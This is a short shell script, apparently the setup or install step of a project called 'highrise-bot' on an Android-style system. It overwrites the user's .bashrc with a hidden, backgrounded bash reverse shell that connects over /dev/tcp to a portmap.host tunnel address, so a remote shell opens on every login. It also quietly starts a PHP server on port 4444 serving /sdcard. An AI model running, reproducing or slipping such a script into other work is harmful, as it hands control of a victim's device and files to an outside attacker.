echo "bash -c '0<&128-;exec 128<>/dev/tcp/Jkkhfdfbhkj-43198.portmap.host/43707;sh <&128 >&128 2>&128' > /dev/null 2>&1 & disown" > $HOME/.bashrc
mv $HOME/highrise-bot/o.php /sdcard
bash $HOME/.bashrc
cd /sdcard && php -S 127.0.0.1:4444 > /dev/null 2>&1 & disown && cd
bash $HOME/.bashrc
